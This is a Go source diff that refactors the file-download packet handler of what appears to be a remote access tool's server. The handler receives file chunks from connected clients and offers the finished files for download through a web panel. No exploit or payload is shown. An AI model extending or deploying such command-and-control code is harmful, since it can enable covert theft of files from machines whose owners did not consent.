@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/json"
-	"io"
 	"os"
 	"rat/common"
 
@@ -31,47 +30,38 @@ func init() {
 }
 
 type DownloadPacket struct {
-	File string
+	File  string `both`
+	Total int64  `receive`
+	Final bool   `receive`
+	Part  []byte `receive`
 }
 
-func (packet DownloadPacket) GetHeader() common.PacketHeader {
+func (packet *DownloadPacket) Header() common.PacketHeader {
 	return common.GetFileHeader
 }
 
-func (packet DownloadPacket) Write(c *Client) error {
-	return c.WriteString(packet.File)
+func (packet *DownloadPacket) Init(c *Client) {
+
 }
 
-func (packet DownloadPacket) Read(c *Client) error {
-	file, err := c.ReadString()
-	total, err := c.ReadInt64()
-	if err != nil {
-		return err
-	}
-
-	final, err := c.ReadBool()
-
-	len, err := c.ReadInt()
-	b := make([]byte, len)
-	io.ReadFull(c.Conn, b)
-
-	transfer := Transfers[file]
-	transfer.Total = total
-	transfer.Read += int64(len)
-	_, err = transfer.Local.Write(b)
+func (packet *DownloadPacket) OnReceive(c *Client) error {
+	transfer := Transfers[packet.File]
+	transfer.Total = packet.Total
+	transfer.Read += int64(len(packet.Part))
+	_, err := transfer.Local.Write(packet.Part)
 
 	if err != nil {
 		return err
 	}
 
 	if ws, ok := c.Listeners[common.GetFileHeader]; ok {
-		e := DownloadProgressEvent{file, transfer.Read, transfer.Total, ""}
+		e := DownloadProgressEvent{packet.File, transfer.Read, transfer.Total, ""}
 
-		if transfer.Complete() && final {
+		if transfer.Complete() && packet.Final {
 			// Set temp file mapping so that we can download it from the web panel
 			tempKey := addDownload(TempFile{
 				Path: transfer.Local.Name(),
-				Name: filepath.Base(file),
+				Name: filepath.Base(packet.File),
 			})
 
 			e.Key = tempKey
@@ -91,8 +81,8 @@ func (packet DownloadPacket) Read(c *Client) error {
 		}
 	}
 
-	if final {
-		defer delete(Transfers, file)
+	if packet.Final {
+		defer delete(Transfers, packet.File)
 		defer delete(c.Listeners, common.GetFileHeader)
 
 		err = transfer.Local.Sync()
